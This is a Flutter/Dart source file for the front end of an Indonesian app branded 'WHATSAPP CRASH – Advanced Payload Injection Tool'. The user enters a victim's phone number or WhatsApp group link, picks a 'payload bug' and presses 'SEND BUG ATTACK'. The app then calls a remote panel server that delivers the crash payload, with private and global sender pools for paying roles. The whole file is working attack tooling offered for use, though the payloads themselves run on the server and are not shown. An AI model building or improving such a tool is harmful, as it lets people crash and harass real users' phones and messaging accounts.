import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _fadeController;
  late AnimationController _pulseController;
  String selectedBugId = "";

  // State modes (tidak diubah)
  String _selectedBugMode    = "number";
  String _senderMode         = "private";
  int    _privateSenderCount = 0;
  int    _globalSenderCount  = 0;
  bool   _isSending          = false;
  String? _responseMessage;

  // ── Tema Merah Gelap (gambar pertama) ──
  static const Color _bg         = Color(0xFF090909);
  static const Color _card       = Color(0xFF130606);
  static const Color _inputBg    = Color(0xFF0E0404);
  static const Color _red        = Color(0xFFE53935);
  static const Color _redDark    = Color(0xFFB71C1C);
  static const Color _redDim     = Color(0xFF3D0808);
  static const Color _textWhite  = Colors.white;
  static const Color _textGrey   = Color(0xFF9E9E9E);

  final LinearGradient _redGradient = const LinearGradient(
    colors: [Color(0xFFB71C1C), Color(0xFFE53935)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );

  // Video
  late VideoPlayerController _videoController;
  late ChewieController      _chewieController;
  bool _isVideoInitialized = false;

  @override
  void initState() {
    super.initState();
    _fadeController  = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat(reverse: true);
    _pulseController = AnimationController(vsync: this, duration: const Duration(milliseconds: 1500))..repeat(reverse: true);

    if (widget.listBug.isNotEmpty) {
      final bugs = _getFilteredBugs();
      if (bugs.isNotEmpty) selectedBugId = bugs[0]['bug_id'];
    }
    _initializeVideoPlayer();
    _fetchSenderStats();
  }

  // ── Semua fungsi logika tidak diubah ──

  List<Map<String, dynamic>> _getFilteredBugs() {
    if (_selectedBugMode == "group")
      return widget.listBug.where((b) => b['bug_id'].contains('_group')).toList();
    return widget.listBug.where((b) => !b['bug_id'].contains('_group')).toList();
  }

  Future<void> _fetchSenderStats() async {
    try {
      final res = await http.get(Uri.parse(
          "http://panelmu.gixsz.biz.id:10079/getSenderStats?key=${widget.sessionKey}"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() {
            _privateSenderCount = data['private'] ?? 0;
            _globalSenderCount  = data['global']  ?? 0;
          });
        }
      }
    } catch (e) { debugPrint("Error fetching sender stats: $e"); }
  }

  void _initializeVideoPlayer() {
    _videoController = VideoPlayerController.asset('assets/videos/banner.mp4');
    _videoController.initialize().then((_) {
      setState(() {
        _videoController.setVolume(0.1);
        _chewieController = ChewieController(
          videoPlayerController: _videoController,
          autoPlay: true, looping: true,
          showControls: false, autoInitialize: true,
        );
        _isVideoInitialized = true;
      });
    }).catchError((e) {
      debugPrint("Video init error: $e");
      setState(() => _isVideoInitialized = false);
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _pulseController.dispose();
    targetController.dispose();
    _videoController.dispose();
    if (_isVideoInitialized) _chewieController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) =>
      input.contains('chat.whatsapp.com') && input.contains('https://');

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key      = widget.sessionKey;

    if (_selectedBugMode == "number") {
      if (formatPhoneNumber(rawInput) == null || key.isEmpty) {
        _showAlert("❌ Invalid Number", "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("❌ Invalid Link", "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    final currentBugs = _getFilteredBugs();
    if (!currentBugs.any((b) => b['bug_id'] == selectedBugId)) {
      if (currentBugs.isNotEmpty) {
        setState(() => selectedBugId = currentBugs[0]['bug_id']);
      } else {
        _showAlert("⚠️ Error", "Tidak ada bug tersedia untuk mode ini.");
        return;
      }
    }

    setState(() { _isSending = true; _responseMessage = null; });

    try {
      final res = await http.get(Uri.parse(
          "http://panelmu.gixsz.biz.id:10079/sendBug?key=$key&target=$rawInput&bug=$selectedBugId&senderMode=$_senderMode"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        setState(() => _responseMessage = "⏳ Cooldown: Tunggu beberapa saat.");
      } else if (data["valid"] == false) {
        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
      } else if (data["sended"] == false) {
        setState(() => _responseMessage = "⚠️ Gagal: Server sedang maintenance.");
      } else {
        setState(() => _responseMessage = "✅ Berhasil mengirim bug!");
        targetController.clear();
        _fetchSenderStats();
      }
    } catch (_) {
      setState(() => _responseMessage = "❌ Error: Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1A0505),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: _red.withOpacity(0.5)),
        ),
        title: Text(title,
            style: const TextStyle(color: _red, fontFamily: 'Orbitron', fontWeight: FontWeight.bold)),
        content: Text(msg, style: const TextStyle(color: _textGrey, fontFamily: 'ShareTechMono')),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("OK", style: TextStyle(color: _red, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  // ══════════════════════════════════════════════════════
  //  WIDGET BUILDERS
  // ══════════════════════════════════════════════════════

  // 1. Header "WHATSAPP CRASH" + badge role (gambar pertama)
  Widget _buildHeaderPanel() {
    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: _card,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _red.withOpacity(0.5), width: 1.5),
        boxShadow: [
          BoxShadow(color: _red.withOpacity(0.2), blurRadius: 24, offset: const Offset(0, 8)),
        ],
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          // Bug icon
          Container(
            width: 64, height: 64,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: _redDim,
              border: Border.all(color: _red.withOpacity(0.7), width: 2),
              boxShadow: [BoxShadow(color: _red.withOpacity(0.35), blurRadius: 14)],
            ),
            child: const Icon(Icons.bug_report_rounded, color: _red, size: 32),
          ),
          const SizedBox(width: 16),
          // Title + subtitle
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  "WHATSAPP\nCRASH",
                  style: TextStyle(
                    color: _red,
                    fontSize: 22,
                    fontWeight: FontWeight.w900,
                    fontFamily: 'Orbitron',
                    letterSpacing: 1,
                    height: 1.15,
                  ),
                ),
                const SizedBox(height: 6),
                Text(
                  "Advanced Payload Injection Tool",
                  style: TextStyle(color: _textGrey.withOpacity(0.75),
                      fontSize: 11, fontFamily: 'ShareTechMono'),
                ),
              ],
            ),
          ),
          // Role badge
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 7),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: _red, width: 1.5),
              color: _red.withOpacity(0.08),
            ),
            child: Text(
              widget.role.toUpperCase(),
              style: const TextStyle(
                color: _textWhite, fontSize: 12,
                fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono', letterSpacing: 1,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // 2. Video player
  Widget _buildVideoPlayer() {
    if (!_isVideoInitialized) {
      return Container(
        width: double.infinity, height: 200,
        decoration: BoxDecoration(
          color: _card, borderRadius: BorderRadius.circular(18),
          border: Border.all(color: _red.withOpacity(0.2)),
        ),
        child: const Center(child: CircularProgressIndicator(color: _red, strokeWidth: 3)),
      );
    }
    return Container(
      width: double.infinity,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: _red.withOpacity(0.3), width: 1.5),
        boxShadow: [BoxShadow(color: _red.withOpacity(0.12), blurRadius: 20)],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(18),
        child: AspectRatio(
          aspectRatio: _videoController.value.aspectRatio,
          child: Stack(
            children: [
              Chewie(controller: _chewieController),
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [Colors.transparent, _red.withOpacity(0.07)],
                    begin: Alignment.topCenter, end: Alignment.bottomCenter,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // 3. Mode selector (BUG NOMOR / BUG GROUP)
  Widget _buildModeSelector() {
    return Row(
      children: [
        Expanded(child: _modeBtn(
          label: "BUG NOMOR", icon: Icons.phone_android_rounded,
          selected: _selectedBugMode == "number",
          onTap: () => setState(() {
            _selectedBugMode = "number"; targetController.clear();
            final bugs = _getFilteredBugs();
            if (bugs.isNotEmpty) selectedBugId = bugs[0]['bug_id'];
          }),
        )),
        const SizedBox(width: 12),
        Expanded(child: _modeBtn(
          label: "BUG GROUP", icon: Icons.group_add_rounded,
          selected: _selectedBugMode == "group",
          onTap: () => setState(() {
            _selectedBugMode = "group"; targetController.clear();
            final bugs = _getFilteredBugs();
            if (bugs.isNotEmpty) selectedBugId = bugs[0]['bug_id'];
          }),
        )),
      ],
    );
  }

  Widget _modeBtn({required String label, required IconData icon,
      required bool selected, required VoidCallback onTap}) {
    return GestureDetector(
      onTap: onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: selected ? _red.withOpacity(0.18) : Colors.transparent,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: selected ? _red : _textGrey.withOpacity(0.2),
            width: selected ? 2 : 1,
          ),
          boxShadow: selected ? [BoxShadow(color: _red.withOpacity(0.18), blurRadius: 14)] : [],
        ),
        child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
          Icon(icon, color: selected ? _red : _textGrey, size: 20),
          const SizedBox(width: 8),
          Text(label, style: TextStyle(
            color: selected ? _red : _textGrey,
            fontWeight: FontWeight.bold, fontSize: 13, fontFamily: 'Orbitron',
          )),
        ]),
      ),
    );
  }

  // 4. Input panel (dalam card, label merah)
  Widget _buildInputPanel() {
    final availableBugs = _getFilteredBugs();

    return Container(
      padding: const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color: _card,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _red.withOpacity(0.18)),
        boxShadow: [BoxShadow(color: _red.withOpacity(0.07), blurRadius: 16)],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          _buildModeSelector(),
          const SizedBox(height: 22),

          // Label target (merah)
          Text(
            _selectedBugMode == "number" ? "TARGET NUMBER" : "LINK GROUP WA",
            style: const TextStyle(
              color: _red, fontWeight: FontWeight.w800,
              fontSize: 12, fontFamily: 'Orbitron', letterSpacing: 1.5,
            ),
          ),
          const SizedBox(height: 10),

          // Input field
          Container(
            decoration: BoxDecoration(
              color: _inputBg, borderRadius: BorderRadius.circular(14),
              border: Border.all(color: _red.withOpacity(0.2)),
            ),
            child: TextField(
              controller: targetController,
              style: const TextStyle(color: _textWhite, fontSize: 14, fontFamily: 'ShareTechMono'),
              cursorColor: _red,
              keyboardType: _selectedBugMode == "number" ? TextInputType.phone : TextInputType.url,
              decoration: InputDecoration(
                hintText: _selectedBugMode == "number" ? "e.g.  +628xxxxxxxxx" : "https://chat.whatsapp.com/...",
                hintStyle: TextStyle(color: _textGrey.withOpacity(0.4), fontFamily: 'ShareTechMono'),
                prefixIcon: Icon(
                  _selectedBugMode == "number" ? Icons.phone_android_rounded : Icons.link_rounded,
                  color: _red.withOpacity(0.7), size: 20,
                ),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide.none),
                enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide.none),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(14),
                  borderSide: const BorderSide(color: _red, width: 1.5),
                ),
                contentPadding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
                filled: true, fillColor: Colors.transparent,
              ),
            ),
          ),

          const SizedBox(height: 22),

          // Label bug (merah)
          const Text(
            "SELECT PAYLOAD BUG",
            style: TextStyle(
              color: _red, fontWeight: FontWeight.w800,
              fontSize: 12, fontFamily: 'Orbitron', letterSpacing: 1.5,
            ),
          ),
          const SizedBox(height: 10),

          // Dropdown
          if (availableBugs.isNotEmpty)
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 14),
              decoration: BoxDecoration(
                color: _inputBg, borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _red.withOpacity(0.2)),
              ),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  dropdownColor: const Color(0xFF1A0505),
                  value: selectedBugId,
                  isExpanded: true,
                  iconEnabledColor: _red,
                  iconSize: 26,
                  style: const TextStyle(color: _textWhite, fontSize: 14, fontFamily: 'ShareTechMono'),
                  items: availableBugs.map((bug) => DropdownMenuItem<String>(
                    value: bug['bug_id'],
                    child: Row(children: [
                      const Text("[  ", style: TextStyle(color: _red, fontFamily: 'ShareTechMono')),
                      const Icon(Icons.close_rounded, color: _red, size: 13),
                      const SizedBox(width: 6),
                      Expanded(child: Text(
                        bug['bug_name'].toString().toUpperCase(),
                        style: const TextStyle(color: _textWhite, fontFamily: 'ShareTechMono'),
                        overflow: TextOverflow.ellipsis,
                      )),
                      const Text("  ]", style: TextStyle(color: _red, fontFamily: 'ShareTechMono')),
                    ]),
                  )).toList(),
                  onChanged: (v) => setState(() => selectedBugId = v ?? ""),
                ),
              ),
            )
          else
            Center(child: Text("Tidak ada bug tersedia untuk mode ini.",
                style: TextStyle(color: _textGrey.withOpacity(0.6), fontFamily: 'ShareTechMono'))),
        ],
      ),
    );
  }

  // 5. Sender toggle (owner/vip only)
  Widget _buildSenderToggle() {
    return Row(children: [
      Expanded(child: _senderBtn(label: "SENDER PRIVATE", count: _privateSenderCount,
          selected: _senderMode == 'private', onTap: () => setState(() => _senderMode = 'private'))),
      const SizedBox(width: 12),
      Expanded(child: _senderBtn(label: "SENDER GLOBAL", count: _globalSenderCount,
          selected: _senderMode == 'global', onTap: () => setState(() => _senderMode = 'global'))),
    ]);
  }

  Widget _senderBtn({required String label, required int count,
      required bool selected, required VoidCallback onTap}) {
    return GestureDetector(
      onTap: onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: selected ? _red.withOpacity(0.14) : _card,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: selected ? _red : _textGrey.withOpacity(0.2),
              width: selected ? 2 : 1),
          boxShadow: selected ? [BoxShadow(color: _red.withOpacity(0.18), blurRadius: 10)] : [],
        ),
        child: Column(children: [
          Text(label, style: TextStyle(
            color: selected ? _red : _textGrey, fontWeight: FontWeight.bold,
            fontSize: 11, fontFamily: 'Orbitron',
          )),
          const SizedBox(height: 4),
          Text("$count Active", style: const TextStyle(color: Colors.white54, fontSize: 10)),
        ]),
      ),
    );
  }

  // 6. Send button (pulsing red glow)
  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, _) => Container(
        height: 65,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(20),
          gradient: _redGradient,
          boxShadow: [
            BoxShadow(
              color: _red.withOpacity(0.3 + _pulseController.value * 0.3),
              blurRadius: 10 + _pulseController.value * 22,
              spreadRadius: _pulseController.value * 2,
            ),
          ],
        ),
        child: ElevatedButton(
          onPressed: _isSending ? null : _sendBug,
          style: ElevatedButton.styleFrom(
            backgroundColor: Colors.transparent, shadowColor: Colors.transparent,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
            elevation: 0,
          ),
          child: _isSending
              ? const SizedBox(width: 24, height: 24,
                  child: CircularProgressIndicator(color: Colors.white, strokeWidth: 3))
              : const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                  Icon(Icons.rocket_launch_rounded, color: Colors.white, size: 22),
                  SizedBox(width: 12),
                  Text("SEND BUG ATTACK",
                      style: TextStyle(color: Colors.white, fontWeight: FontWeight.w900,
                          fontSize: 17, letterSpacing: 2, fontFamily: 'Orbitron')),
                ]),
        ),
      ),
    );
  }

  // 7. Response message
  Widget _buildResponseMessage() {
    if (_responseMessage == null) return const SizedBox.shrink();
    final bool isSuccess = _responseMessage!.startsWith('✅');
    final Color color    = isSuccess ? Colors.greenAccent : _red;
    final IconData icon  = isSuccess
        ? Icons.check_circle_outline_rounded
        : (_responseMessage!.startsWith('⏳') ? Icons.hourglass_bottom_rounded : Icons.error_outline_rounded);

    return Padding(
      padding: const EdgeInsets.only(top: 14),
      child: Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: color.withOpacity(0.08),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: color.withOpacity(0.4)),
          boxShadow: [BoxShadow(color: color.withOpacity(0.08), blurRadius: 10)],
        ),
        child: Row(children: [
          Icon(icon, color: color, size: 22),
          const SizedBox(width: 10),
          Expanded(child: Text(_responseMessage!,
              style: TextStyle(color: color, fontWeight: FontWeight.bold,
                  fontSize: 13, fontFamily: 'ShareTechMono'))),
        ]),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bg,
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 18),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              _buildHeaderPanel(),
              const SizedBox(height: 14),
              _buildVideoPlayer(),
              const SizedBox(height: 14),
              _buildInputPanel(),
              const SizedBox(height: 14),
              if (widget.role == 'owner' || widget.role == 'vip') ...[
                _buildSenderToggle(),
                const SizedBox(height: 14),
              ],
              _buildSendButton(),
              _buildResponseMessage(),
              const SizedBox(height: 24),
            ],
          ),
        ),
      ),
    );
  }
}
